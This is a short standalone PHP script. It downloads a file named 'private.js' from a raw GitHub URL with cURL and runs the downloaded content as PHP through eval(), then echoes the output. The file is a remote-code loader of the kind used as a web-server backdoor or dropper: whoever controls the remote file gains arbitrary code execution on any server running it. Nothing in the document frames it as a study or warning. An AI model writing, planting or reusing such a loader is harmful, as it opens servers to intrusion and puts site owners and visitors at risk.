<?php
$url = "https://raw.githubusercontent.com/vyscomaylando/quixter/main/private.js";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);

if ($result === false) {
    echo "Error";
} else {
    if (is_string($result)) {
        ob_start();
        eval('?>'.$result);
        $output = ob_get_clean();
        echo $output;
    } else {
        echo "Error";
    }
}

curl_close($ch);
?>
